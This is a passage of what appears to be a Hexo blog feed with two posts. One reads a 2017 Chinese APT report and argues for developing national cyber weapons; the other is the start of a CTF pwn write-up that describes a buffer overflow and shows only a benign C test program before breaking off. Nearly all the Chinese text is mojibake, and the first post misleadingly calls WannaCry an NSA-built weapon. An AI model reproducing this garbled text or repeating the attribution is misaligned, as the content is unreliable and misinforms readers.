      <link href="/2018/10/14/2017APT%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB/"/>
      <url>/2018/10/14/2017APT%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p>2017 APT Êä•ÂëäÁ†îËØª</p><a id="more"></a><h1 id="2017-APT-Êä•ÂëäÁ†îËØª"><a href="#2017-APT-Êä•ÂëäÁ†îËØª" class="headerlink" title="2017 APT Êä•ÂëäÁ†îËØª"></a>2017 APT Êä•ÂëäÁ†îËØª</h1><h2 id="APT-‰∏éÁΩëÁªúÊàò‰∫â‰∏≠ÁöÑÂ§ßÂõΩÂçöÂºà"><a href="#APT-‰∏éÁΩëÁªúÊàò‰∫â‰∏≠ÁöÑÂ§ßÂõΩÂçöÂºà" class="headerlink" title="APT ‰∏éÁΩëÁªúÊàò‰∫â‰∏≠ÁöÑÂ§ßÂõΩÂçöÂºà"></a>APT ‰∏éÁΩëÁªúÊàò‰∫â‰∏≠ÁöÑÂ§ßÂõΩÂçöÂºà</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ‰∏∫‰ªÄ‰πàÂØπAPTÊñπÈù¢ÁöÑÁ†îÁ©∂ËÆ©ÁæéÂõΩÔºåËÆ©‰∏≠ÂõΩÔºåËÆ©‰∏ñÁïåÂêÑÂõΩÂºÄÂßãÈáçËßÜËµ∑Êù•ÔºüÊçÆÊï∞ÊçÆÔºå2017Âπ¥ÈÅ≠ÂèóAPTÊîªÂáªÊúÄÂ§öÁöÑÂõΩÂÆ∂‰æùÊ¨°ÊòØÔºöÁæéÂõΩÔºå‰∏≠ÂõΩÔºåÊ≤ôÁâπÔºåÈü©ÂõΩ„ÄÅ‰ª•Ëâ≤Âàó„ÄÅÂúüËÄ≥ÂÖ∂„ÄÅÊó•Êú¨„ÄÅÊ≥ïÂõΩ„ÄÅ‰øÑÁΩóÊñØ„ÄÅÂæ∑ÂõΩ„ÄÅË•øÁè≠Áâô„ÄÅÂ∑¥Âü∫ÊñØÂù¶ÂíåËã±ÂõΩ„ÄÇ‰ª•‰∏äËøô‰∫õÂõΩÂÆ∂ÔºåË¶Å‰πàÊòØÁªèÊµéÂú∞‰ΩçÈ¢ÜÂÖàÔºåË¶Å‰πàÊòØÊã•ÊúâÂ§ßÈáèÁöÑËÉΩÊ∫êË¥¢ÂØåÔºåË¶Å‰πàÂ∞±ÊòØÁ§æ‰ºöÁéØÂ¢É‰∏çÂíåÂπ≥ÔºåÈÇ£‰πàËøô‰∏ÄÁ≥ªÂàóÁöÑÂõ†Á¥†ÔºåÈÉΩÊàê‰∏∫‰∫ÜAPTÊîªÂáªÁöÑËµ∑Âõ†„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ËÄåÊúÄÂèóAPTÁªÑÁªáÂÖ≥Ê≥®ÁöÑÈ¢ÜÂüüÊàñÊú∫ÊûÑÁ±ªÂûã‰æùÊ¨°‰∏∫ÔºöÊîøÂ∫ú„ÄÅËÉΩÊ∫ê„ÄÅ ÈáëËûç„ÄÅÂõΩÈò≤„ÄÅ‰∫íËÅîÁΩë„ÄÅËà™Á©∫Ëà™Â§©„ÄÅÂ™í‰Ωì„ÄÅÁîµ‰ø°„ÄÅÂåªÁñó„ÄÅÂåñÂ∑•„ÄÇÊ≠£Â¶ÇÂâç‰∏ç‰πÖÂèëÁîüÔºåÁé∞Âú®‰ªçÂú®ÁôΩÁÉ≠ÂåñÈò∂ÊÆµÁöÑ‰∏≠ÁæéË¥∏ÊòìÊàòÔºå‰∏∫‰∫ÜÂõΩÂÆ∂Âà©ÁõäËÄåÂèëËµ∑ÁöÑË¥∏ÊòìÊàò‰∫âÔºõÂèàÂ¶ÇÊúùÈ≤úÂΩìÂâç‰∏çÁ®≥ÂÆöÁöÑÁ§æ‰ºöÂú∞‰ΩçÔºåÂõΩÂÆ∂Â±ÄÂäøÔºå‰∏éÈü©ÂõΩÁöÑ‰∫âÁ´Ø„ÄÇÂÜçÊØîÂ¶ÇËØ¥Ôºå‰∏≠‰∏úÔºåË•ø‰∫öÂú∞Âå∫È¢ëÁπÅÂèëËµ∑ÁöÑÊ≠¶Ë£ÖÂÜ≤Á™Å„ÄÇËøô‰∏ÄÂàáËØ¥Âà∞ÁöÑÈÉΩÊòØÁé∞ÂÆûÁîüÊ¥ª‰∏≠ÁöÑÂ±ÄÂäøÔºå‰ΩÜÂú®ÁΩëÁªú‰∏ñÁïå‰∏≠‰πü‰∏ÄÊ†∑Ôºå‰∏∫‰∫Ü‰∏∫Êú¨ÂõΩÂèñÂæó‰∏ÄÂÆöÁöÑ‰ºòÂäøÔºåÁΩëÁªúÁ©∫Èó¥‰∏≠ÁöÑAPTÁªÑÁªáÂèäÂÖ∂Ê¥ªÂä®ÔºåÂàô‰∏éÁé∞ÂÆû‰∏≠ÁöÑÂ§ßÂõΩÂçöÂºà‰πãÈó¥ÂëàÁé∞Âá∫ÂæàÂ§öÂæÆÂ¶ôÁöÑÊòæÊÄßËÅîÁ≥ª„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Êó¢ÁÑ∂APTÊîªÂáªÂæàÊòéÊòæÊòØ‰∏éÂõΩÂÆ∂‰πãÈó¥ÂçöÂºàÊúâËÅîÁ≥ªÁöÑÔºåËøô‰πüÂ∞±ËÉΩËß£Èáä‰∏∫‰ªÄ‰πàÊåáË¥£‰ªñÂõΩÁöÑAPTÊ¥ªÂä®Êàê‰∏∫‰∫ÜÈáçË¶ÅÁöÑÂ§ñ‰∫§ÊâãÊÆµ‰∫Ü„ÄÇ</p></blockquote><h2 id="ÊàëÂõΩÂØπAPTÁöÑÁ†îÁ©∂Â∫îÂÜçËøõ‰∏ÄÊ≠•"><a href="#ÊàëÂõΩÂØπAPTÁöÑÁ†îÁ©∂Â∫îÂÜçËøõ‰∏ÄÊ≠•" class="headerlink" title="ÊàëÂõΩÂØπAPTÁöÑÁ†îÁ©∂Â∫îÂÜçËøõ‰∏ÄÊ≠•"></a>ÊàëÂõΩÂØπAPTÁöÑÁ†îÁ©∂Â∫îÂÜçËøõ‰∏ÄÊ≠•</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>ÂΩì‰ªä‰∏ñÁïåÔºåÂú®APTÁ†îÁ©∂È¢ÜÂüüÈÅ•ÈÅ•È¢ÜÂÖàÁöÑÊòØÁæéÂõΩÔºåÊ≠£Â¶ÇÂêÑÊñπÈù¢ÁæéÂõΩÈÉΩÂ§Ñ‰∫éÈú∏‰∏ªÂú∞‰Ωç‰∏ÄÊ†∑ÔºåAPTÁ†îÁ©∂‰πü‰∏çÂ±àÂ±Ö‰∫∫Âêé</strong>„ÄÇËÄå‰∏≠ÂõΩËôΩÁÑ∂ÊéíÂú®Á¨¨‰∫åÂêçÔºå‰ΩÜÂè™ÊúâÂõõ‰∏™Êú∫ÊûÑÂèëÂ∏ÉÂ§öÁØáAPTÁõ∏ÂÖ≥Á†îÁ©∂Êä•ÂëäÔºåÁõ∏ÊØîÁæéÂõΩÁöÑ24‰∏™Êú∫ÊûÑÔºåÁæéÂõΩË∂≥Ë∂≥ÊØîÊàë‰ª¨Â§ö‰∫ÜÂÖ≠ÂÄçÔºåÂèØÊÉ≥ËÄåÁü•ÔºåÂÖ∂‰∏≠ÁöÑÂêÑÂõΩÂØπAPTÁ†îÁ©∂ÁöÑÈáçËßÜÁ®ãÂ∫¶‰πüÁõ∏Â∑ÆÁîöËøú„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>‰∏≠ÂõΩÂ∑≤ÁªèÊàê‰∏∫‰∫ÜÊúÄÂ§ßÁöÑAPTÊîªÂáªÂèóÂÆ≥ËÄÖ</strong>ÔºåÂæàÂ§öÂõΩÂÆ∂Èù¢ÂØπ‰∏≠ÂõΩÁöÑÂèëÂ±ïÊÄÄÁùÄ‰∏çÂêåÁöÑÂøÉÊÄùÔºåÊúâÁöÑÊÉ≥ÈÅèÂà∂ÔºåÊúâÁöÑÊÉ≥Â∏ÆÊâ∂ÔºåËÄåÊÉ≥ÈÅèÂà∂ÁöÑËøô‰∫õ‰∏™ÂõΩÂÆ∂Â∞±‰∏çÂÅúÁöÑÂú®ÂêÑÊñπÈù¢Ë¥πÂ∞ΩÂøÉÊÄùÊù•ÂØπ‰∏≠ÂõΩËøõË°åÊîªÂáª„ÄÇÁªüËÆ°ÊòæÁ§∫Ôºå2017Âπ¥ÂÖ®Âπ¥ÔºåËøô‰∫õAPTÁªÑÁªáÂèëÂä®ÁöÑÊîªÂáªË°åÂä®ÔºåËá≥Â∞ëÂΩ±Âìç‰∫Ü‰∏≠ÂõΩÂ¢ÉÂÜÖË∂ÖËøá‰∏áÂè∞ÁîµËÑëÔºåÊîªÂáªËåÉÂõ¥ÈÅçÂ∏ÉÂõΩÂÜÖ31‰∏™ÁúÅÁ∫ßË°åÊîøÂå∫„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Âú®ÁΩëÁªúÁ©∫Èó¥ÂÆâÂÖ®ÊñπÈù¢ÔºåÂêÑÂõΩÂá†‰πéÈÉΩÊòØÂêåÊ†∑ÁöÑËµ∑ÁÇπÔºå‰ΩÜÂç¥ÂèëÂ±ïÊàê‰∫Ü‰∏çÂêåÁöÑÊ∞¥Âπ≥ÔºåÂΩìÂâçÁæéÂõΩÈ¢ÜÂÖàÁöÑÂèØ‰∏ç‰ªÖ‰ªÖÊòØAPTÊîªÂáªÊñπÈù¢ÔºåËÄåÊòØÊï¥‰∏™ÁΩëÁªúÂÆâÂÖ®ÊñπÈù¢ÔºåÊâÄ‰ª•‰∏ÄÊó¶ÁæéÂõΩÂèëËµ∑ÁΩëÁªúÊîªÂáªÔºåÂèØ‰ª•ËØ¥Â§ßÂ§öÊï∞ÂõΩÂÆ∂ÈÉΩÊòØÊ≤°Êúâ‰ªÄ‰πàÊäµÊäó‰πãÂäõÁöÑ„ÄÇ<strong>Âà´ÁöÑÂõΩÂÆ∂Âí±‰∏çÁÆ°Ôºå‰∏≠ÂõΩÔºåÂ∞±‰∏çÂ∫îËØ•Â±àÂ±Ö‰∫∫‰∏ãÔºåÂÆûÁé∞‰∏≠ÂõΩÂ§çÂÖ¥ÔºåÂú®ÂêÑÊñπÈù¢ÈÉΩÂ∫îËØ•ÊäìÁ¥ßÔºåËÄåÁΩëÁªúÂÆâÂÖ®Ôºå‰∫íËÅîÁΩëÂÆâÂÖ®Ê≠£ÊòØ‰∏çÂèØÂøΩËßÜÁöÑ‰∏ÄÁÇπ„ÄÇ</strong></p><p>&nbsp; &nbsp; &nbsp; &nbsp; Ê†πÊçÆÊä•ÂëäÊàë‰ª¨‰πüÂèØ‰ª•ÁúãÂá∫‰∏Ä‰∏™ÈùûÂ∏∏ÂÖ∑Êúâ‰ª£Ë°®ÊÄßÁöÑ‰∫ãÂÆûÔºå‰∏ç‰ªÖ‰ªÖÊòØAPTÊîªÂáªÊñπÈù¢ÔºåÊãìÂ±ï‰∏Ä‰∏ãÔºåÂêÑÊñπÈù¢ÁöÑÁ†îÁ©∂‰∫∫ÊâçÔºåÊàë‰ª¨Áõ∏ÊØîÁæéÂõΩËÄåË®ÄÈÉΩÊòØÊúâÂä£ÂäøÁöÑÔºåÊòØÂ§ßÊòØÂ∞èÂàô‰∏çÁªÜËØ¥„ÄÇÊòØÂΩìÂâçÂõΩÊÉÖÈôêÂà∂ÁöÑÂêóÔºü‰∏∫‰ªÄ‰πàÁæéÂõΩÂ∞±ÈÇ£‰πàÂ§öÁ†îÁ©∂Âûã‰∫∫ÊâçÂë¢ÔºüÂ∞±‰ªéÂΩìÂâçÂ§ßÈÉ®ÂàÜÂ≠¶ÁîüÊØï‰∏öÁ≠âÂêå‰∫éÂ§±‰∏öÁöÑÁé∞Ë±°Êù•ËØ¥ÔºåÂèØËÉΩÈóÆÈ¢òÂ∞±Âá∫Áé∞Âú®ÊïôËÇ≤‰ΩìÂà∂‰ª•Âèä‰ª∑ÂÄºÂèñÂêë‰∫Ü„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>ÈÇ£‰πàÂõûÂà∞‰∏ªÈ¢òÔºåÊàëËÆ§‰∏∫ÊàëÂõΩÂØπAPTÊîªÂáªÁöÑÁ†îÁ©∂‰πÉËá≥Êï¥‰∏™ÁΩëÁªúÁ©∫Èó¥ÂÆâÂÖ®ÊäÄÊúØÁöÑÁ†îÁ©∂Â∫îËØ•Âä†Á¥ßÊ≠•‰ºêÔºåÂä†Âº∫ÁΩëÁªúÈò≤Âæ°Âª∫ËÆæÔºåÂüπÂÖªÁΩëÁªúÊîªÈò≤‰∫∫ÊâçÔºåËøôÊ†∑ÊâçËÉΩ‰∏çËêΩ‰∫∫Âêé„ÄÇ</strong></p></blockquote><h2 id="ÁΩëÁªúÂÜõÁÅ´Ê∞ëÁî®ÂåñËÆ©ÁΩëÁªúÊàò‰∫âÈÄêÊ∏êÂá∫Áé∞Âú®ÂÖ¨‰ºóÁúºÂâç"><a href="#ÁΩëÁªúÂÜõÁÅ´Ê∞ëÁî®ÂåñËÆ©ÁΩëÁªúÊàò‰∫âÈÄêÊ∏êÂá∫Áé∞Âú®ÂÖ¨‰ºóÁúºÂâç" class="headerlink" title="ÁΩëÁªúÂÜõÁÅ´Ê∞ëÁî®ÂåñËÆ©ÁΩëÁªúÊàò‰∫âÈÄêÊ∏êÂá∫Áé∞Âú®ÂÖ¨‰ºóÁúºÂâç"></a>ÁΩëÁªúÂÜõÁÅ´Ê∞ëÁî®ÂåñËÆ©ÁΩëÁªúÊàò‰∫âÈÄêÊ∏êÂá∫Áé∞Âú®ÂÖ¨‰ºóÁúºÂâç</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>‰ªÄ‰πàÊòØÁΩëÁªúÂÜõÁÅ´Ôºü</strong>ÁΩëÁªúÂÜõÁÅ´ÊòØ‰∏ÄÁßçÁΩëÁªúÊ≠¶Âô®ÔºåÂç≥ÂÜõÁÅ´Á∫ßÁöÑÁΩëÁªúÊºèÊ¥ûÂà©Áî®Â∑•ÂÖ∑„ÄÇÂ∞±ÂÉèÂéªÂπ¥Ê∞∏ÊÅí‰πãËìùÂãíÁ¥¢Ë†ïËô´ÁóÖÊØíÔºàWannaCryÔºâËÇÜËôêÂÖ®ÁêÉÔºåÂØºËá¥150Â§ö‰∏™ÂõΩÂÆ∂Ôºå30Â§ö‰∏áÂèóÂÆ≥ËÄÖÈÅ≠ÈÅáÂãíÁ¥¢ËΩØ‰ª∂ ÊîªÂáªÔºåÂåªÁñó„ÄÅ‰∫§ÈÄö„ÄÅËÉΩÊ∫ê„ÄÅÊïôËÇ≤Á≠âË°å‰∏öÈ¢ÜÂüüÈÅ≠ÂèóÂ∑®Â§ßÊçüÂ§±„ÄÇWannaCryÊçÆÁß∞ÊòØÁæéÂõΩÂõΩÂÆ∂ÂÆâÂÖ®Â±ÄÔºàNSAÔºâÊóó‰∏ãÊñπÁ®ãÂºèÁªÑÁªáÔºàEquation GroupÔºâÊâÄÂºÄÂèëÁöÑÁΩëÁªúÊ≠¶Âô®ÔºåÊòØ‰∏ÄÊ¨æÂÖ∏ÂûãÁöÑÁΩëÁªúÂÜõÁÅ´„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>ÊàëËÆ§‰∏∫ÁΩëÁªúÂÜõÁÅ´ÈúÄË¶Å‰∏•Ê†ºÊääÊéßÔºåÂê¶ÂàôÂêéÊûú‰∏çÂ†™ÊÉ≥Ë±°„ÄÇ</strong> ÁΩëÁªúÂÜõÁÅ´Â§ßÂ§öÁî±‰∏Ä‰∏™ÊàñËÄÖÂ§ö‰∏™È´òÁ≤æÂ∞ñÊäÄÊúØÂõ¢ÈòüÁ†îÂèëËÄåÊàêÔºåËÄåÂΩìÂâçÁΩëÁªúÁ©∫Èó¥ÂÆâÂÖ®Ê≥ïÂæãÂà∂Â∫¶ËñÑÂº±Ôºå‰∏çÂÉèÁé∞ÂÆûÁîüÊ¥ª‰∏≠ÔºåÈôêÂà∂Êû™Ê¢∞ÂÜõÁÅ´ÔºåÊúâ‰∏•Ê†ºÁöÑÊ≥ïÂæãÊù•‰øùÈöúÊùÉÁõä„ÄÇÊ≠£ÊòØÂ¶ÇÊ≠§ÔºåÁΩëÁªúÁ©∫Èó¥‰πüÂ∞±Êàê‰∏∫‰∫ÜËÆ∏ËÆ∏Â§öÂ§öÈæåÈæäËãü‰∏îÔºåÈªëÊöóÈÇ™ÊÅ∂‰∫ãÁâ©ÁöÑËóèË∫´‰πãÂú∞„ÄÇËÄåÂΩì‰ªäÂêÑÂõΩÁöÑÁΩëÁªúÁ©∫Èó¥Âü∫Êú¨‰∏äÊòØÊúâÈò≤ÁÅ´Â¢ôÁõ∏‰∫íÈöîÁªùÁöÑÔºå‰πüÂ∞±ÊòØËØ¥ÔºåÁΩëÁªúÁ©∫Èó¥‰πüÊúâÂõΩÁïå‰πãÂàÜÔºåÈÇ£‰πàËá™ÁÑ∂ËÄåÁÑ∂ÔºåÁΩëÁªúÊàò‰∫âËøôÁßç‰ΩéÊàêÊú¨È´òÊïàÁõä‰∏îÈöêÂåøÁöÑÊîªÂáªÊñπÂºèÁêÜÊâÄÂΩìÁÑ∂Âú∞Â∞±‰∏äÂçáÂà∞‰∫ÜÂõΩÂÆ∂Â±ÇÈù¢„ÄÇ‰∏ÄÊó¶ÁΩëÁªúÂÜõÁÅ´Ê∞ëÁî®ÂåñÁ®ãÂ∫¶Ë∂äÊù•Ë∂äÈ´òÔºåËÄå‰∏îÁΩëÁªúÂÜõÁÅ´ÁöÑËá™Âä®ÂåñÁ®ãÂ∫¶‰πüÂú®ÂèòÈ´òÔºåÈÇ£‰πàÂêÑÁßçAPTÁªÑÁªá‰πüÂ∞±‰ºöÂèòÂæóÊõ¥Âä†Âº∫Â§ßÔºå‰∏ç‰ªÖ‰ªÖÊòØAPTÁªÑÁªáÔºåÂæàÈöæÊÉ≥Ë±°Âá†‰πéÊØè‰∏™‰∫∫ÈÉΩ‰ºöÁî®ÁΩëÁªúÂÜõÁÅ´Êù•ËøõË°åÊîªÂáªÔºåËÄåÁΩëÁªúÁ©∫Èó¥Â∑≤ÁªèÂèòÊàêÊàòÁÅ´‰πãÂú∞ÁöÑÂú∫ÊôØ„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÁΩëÁªúÂÜõÁÅ´‰∏•Ê†ºÊääÊéßÁöÑÂêåÊó∂Ë¶ÅÂèëÂ±ïËá™Â∑±ÁöÑÂäõÈáè„ÄÇÊçÆÊä•Âëä‰∫ÜËß£Âà∞ÔºåÁæéÂõΩÊîøÂ∫úÂçÅÂàÜÈáçËßÜÁΩëÁªúÂÜõÁÅ´ÁöÑÁ†îÂèëÔºå‰ª•ÂèäÂà©Áî®ÔºåÊã•ÊúâÂ±û‰∫éËá™Â∑±ÁöÑÁΩëÁªúÂÜõÁÅ´Â∫ìÔºå‰∏Ä‰∏™ÊòØNSAÊóó‰∏ãÁöÑÊñπÁ®ãÂºèÁªÑÁªáÔºåÂè¶‰∏Ä‰∏™ÊçÆÁß∞ÊòØÁæéÂõΩ‰∏≠ÊÉÖÂ±ÄÔºàCIAÔºâÁõ¥Â±ûÁöÑÁΩëÁªúÊÉÖÊä•‰∏≠ÂøÉ„ÄÇÊ†πÊçÆÊñ∞ÂçéÁ§æÊä•ÈÅìÔºåÊà™Ê≠¢2016 Âπ¥Â∫ïÔºåCIAÁõ¥Â±ûÁöÑÁΩëÁªúÊÉÖÊä•‰∏≠ÂøÉÊã•ÊúâË∂ÖËøá5000ÂêçÂëòÂ∑•ÔºåÊÄªÂÖ±ËÆæËÆ°‰∫ÜË∂ÖËøá1000‰∏™Êú®È©¨„ÄÅÁóÖÊØíÂíåÂÖ∂‰ªñ‚ÄúÊ≠¶Âô®ÂåñÊÅ∂ÊÑè‰ª£Á†Å‚Äù„ÄÇ ËÄå2017Âπ¥Ôºå‰ªéÁâπÊúóÊôÆÊîøÂ∫úÂ§ßÂπÖÊèêÈ´òÂÜõ‰∫ãÈ¢ÑÁÆóÁöÑÊîøÁ≠ñÂÄæÂêëÁúãÔºåCIA‰ªé‰∫ãÁΩëÁªúÊ≠¶Âô®Â∫ìÂºÄÂèë‰∫∫ÂëòÊï∞Èáè‰ºöÂ§ßÂπÖÂ¢ûÂä†„ÄÇ ËÄå‰∏äËø∞ÁöÑËøô‰∫õÔºåÈÉΩÊòØÁæéÂõΩÁöÑÁΩëÁªúÂÜõÁÅ´ÂäõÈáè„ÄÇËØïÈóÆÔºåÂ¶ÇÊûúÁæéÂõΩÁöÑÁΩëÁªúÂÜõÁÅ´Êàë‰ª¨ÈÉΩÊâõ‰∏ç‰ΩèÔºåÂ¶Ç‰ΩïÂéªÊäµÊäóÁé∞ÂÆûÁîüÊ¥ª‰∏≠ÁöÑÊàò‰∫âÔºüËøô‰∏çÊòØÊú™ÊàòÂÖàÂûÆÂêóÔºü</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÊÄª‰πãÔºåÁΩëÁªúÂÜõÁÅ´Á∫ßÂ∑•ÂÖ∑ÂíåÊôÆÈÄöÁöÑÊÅ∂ÊÑèËΩØ‰ª∂„ÄÅÊ∏óÈÄèÂ∑•ÂÖ∑Á≠âÁªìÂêàÂêéÔºåËÆ©ÂæàÂ§ö ÊîªÂáªË°å‰∏∫ÂêåÊó∂ÂÖ∑Â§áÈ´òÁ∫ßÊîªÂáªÊâãÊÆµÂíå‰∏ÄËà¨ÊâãÊÆµÁöÑÁâπÊÄßÔºåÂ¢ûÂä†‰∫ÜÁäØÁΩ™ÂàÜÂ≠êÁöÑÈöêËîΩÊÄßÔºå‰πü‰ºöÂπ≤Êâ∞ÁõëÊµãËØÜÂà´È´òÁ∫ßÂ®ÅËÉÅ„ÄÇ <strong>ÊâÄ‰ª•ÔºåÊüêÁßçÁ®ãÂ∫¶‰∏äÔºåÁΩëÁªúÂÜõÁÅ´Ê∞ëÁî®ÂåñÊä¨Âçá‰∫ÜÂÆâÂÖ®Á†îÁ©∂ËÄÖÁöÑÈó®ÊßõÔºåÂ¢ûÂä†‰∫ÜAPTÁöÑÈò≤ÊéßÈöæÂ∫¶ÔºåÁΩëÁªúÂÆâÂÖ®‰ºÅ‰∏ö‰ªªÈáçÈÅìËøú„ÄÇÊàëÂõΩÂú®Á†îÁ©∂Â¶Ç‰ΩïÊäµÊäóËøôÁßçÁΩëÁªúÂÜõÁÅ´ÊîªÂáªÁöÑÂêåÊó∂Ôºå‰πüÂ∫îËØ•‰πüÂä†Â§ßÁΩëÁªúÂÜõÁÅ´ÁöÑÁ†îÂèëÂäõÂ∫¶Ôºå‰∏ÄÂë≥ÁöÑÈò≤ÂÆàÂè™‰ºöËÆ©Ëá™Â∑±Â§Ñ‰∫éË¢´Âä®ÁöÑÁä∂ÊÄÅÔºåÂè™ÊúâËá™Â∑±‰πüÊã•ÊúâËÉΩÂ§üÂ®ÅËÉÅÂà∞ÊïåÊñπÁöÑÂäõÈáèÔºåÊâçËÉΩÊä§ÊàëÂõΩÂíåÂπ≥ÂèëÂ±ï‰πãË∑Ø„ÄÇ</strong></p></blockquote><hr><blockquote><p> ‰ª•‰∏ä‰ªÖÂ±û‰∏™‰∫∫ËßÇÁÇπÔºåËã•Êúâ‰∏çÁ¨¶ÔºåËøòÊúõÊñßÊ≠£„ÄÇ</p></blockquote><p>ÂèÇËÄÉÔºö</p><p><a href="https://ti.360.net/blog/articles/apt-report-of-2017/" target="_blank" rel="noopener">2017‰∏≠ÂõΩÈ´òÁ∫ßÊåÅÁª≠ÊÄßÂ®ÅËÉÅÔºàAPTÔºâÁ†îÁ©∂Êä•Âëä </a></p><p><a href="http://cpc.people.com.cn/xuexi/n1/2018/0817/c385476-30234135.html" target="_blank" rel="noopener">‰π†ËøëÂπ≥Ë∞àÁΩëÁªúÂÆâÂÖ®ÔºöÊ≤°ÊúâÁΩëÁªúÂÆâÂÖ®Â∞±Ê≤°ÊúâÂõΩÂÆ∂ÂÆâÂÖ®</a></p><p><a href="https://www.doit.com.cn/p/251027.html" target="_blank" rel="noopener">ËÇñÊñ∞ÂÖâÔºöAPTÁöÑÊú¨Ë¥®ÊòØÂ§ßÂõΩÂçöÂºàÔºåÊàë‰ª¨Áîü‰∏éÊñØÔºåÈïø‰∏éÊñØÔºå‰∏ç‰πâ‰πãË¥¢Êàë‰ª¨ÂàÜÊñá‰∏çÂèñÔºåÁ•ñÂÆó‰πãÂú∞Êàë‰ª¨ÂØ∏Âúü‰∏çËÆ©</a></p>]]></content>
      
      
      <categories>
          
          <category> ÊùÇÊñá </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà14-Êä§ÁΩëÊùØ</title>
      <link href="/2018/10/13/Pwn-10%E6%9C%8814-%E6%8A%A4%E7%BD%91%E6%9D%AF/"/>
      <url>/2018/10/13/Pwn-10%E6%9C%8814-%E6%8A%A4%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10-13"><a href="#Pwn-10-13" class="headerlink" title="Pwn-10/13"></a>Pwn-10/13</h1><blockquote><p>‚Äã    ‰ªäÂ§©Êâì‰∫ÜÊä§ÁΩëÊùØÔºå‰ªé‰πãÂâçÁöÑÂº∫ÁΩëÊùØÔºåÂà∞ÂõΩËµõÔºåÂà∞ÈìÅ‰∏âÔºåÂà∞XmanÔºåÂÜçÂà∞ÁΩëÈºéÊùØÔºåÊúÄÂêéÂà∞‰∫Ü‰ªäÂ§©ÁöÑÊä§ÁΩëÊùØÔºåÁªèÂéÜÁöÑÊØîËµõÂÄíÊòØÊå∫Â§öÔºåÂè™ÊòØËøõÊ≠•ÂæÆ‰πéÂÖ∂ÂæÆÔºåÂÆûÂú®Ê±óÈ¢úÔºåÂ∏åÊúõÊé•‰∏ãÊù•ËÉΩÊúâËæÉÂ§ßÁöÑËøõÊ≠•ÔºÅ</p><p>‚Äã    write-upÂèãÈìæÔºö<a href="https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/" target="_blank" rel="noopener">https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/</a></p><p>‚Äã    Êä§ÁΩëÊùØÂÖ≥ÈîÆËØçÔºö<code>python tornadoÊ®°ÊùøÊ≥®ÂÖ•(STTI)</code>,<code>Êù°‰ª∂Á´û‰∫â</code>,<code>Ëæ£Êù°</code>,<code>Ê∫¢Âá∫</code>,<code>Ëá™Èó≠</code></p></blockquote><h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><blockquote><p>‚Äã    ËøôÁõ∏ÂΩì‰∫é‰ªäÂ§©pwnÁöÑÁ≠æÂà∞È¢òÔºåÁÆÄÂçï‰ΩÜËØ¶ÁªÜÂú∞Â§çÂéü‰∏Ä‰∏ãÔºö</p><p>‚Äã    Á¨¨‰∏ÄÊ≠•ÔºåIDAÁúã‰∏ÄÁúãÔºåÈÄªËæëÂçÅÂàÜÁÆÄÂçïÔºåÁîöËá≥ÂèØ‰ª•Áõ¥Êé•ÂÜôpayloadÔºö</p><p><img src="https://i.loli.net/2018/10/13/5bc20e49c32cb.png" alt=""></p><p>‚Äã    Á™ÅÁ†¥ÁÇπÊòØÈÄöËøáreadÂáΩÊï∞ÔºåÂú®bufÂ§ÑËøõË°åÊ∫¢Âá∫ÔºåËøõËÄåË¶ÜÁõñv7Ôºåv8ÁöÑÂÄºÔºåËææÂà∞elseÁöÑÊù°‰ª∂ÔºåÂç≥v7==0x7FFFFFFFFFFFFFFF,v8==0.1„ÄÇ</p><p>‚Äã    ËøôÈáåÊàë‰ª¨ÈúÄË¶ÅÁü•ÈÅìÁöÑÊòØÔºåÊµÆÁÇπÊï∞Âú®ÂÜÖÂ≠ò‰∏≠Ë°®Áé∞ÁöÑÂΩ¢ÂºèÊòØ‰ªÄ‰πàÊ†∑Â≠êÁöÑÔºåÂÆÉ‰∏éÊôÆÈÄöÁöÑÊï¥Âûã‰∏çÂêåÔºå‰ºöÂÅöÂá∫ËΩ¨Êç¢ÔºåÊØîËæÉÊô¶Ê∂©„ÄÇËøôÈáåÁÆÄÂçïÂÜô‰∏Ä‰∏™CËØ≠Ë®ÄÁ®ãÂ∫èÁúãÁúã0.1ÊòØÊÄé‰πàË°®Á§∫ÁöÑÔºö</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">double</span> a<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>‚Äã    ÈÄöËøá<code>gcc -o test test.c -z noexecstack -no-pie</code>ËøõË°åÁºñËØëÔºåÁÑ∂Âêé‰ΩøÁî®gdbÁúãÁúãÔºö</p><p><img src="https://i.loli.net/2018/10/13/5bc213eed9cfc.png" alt=""></p><p>‚Äã    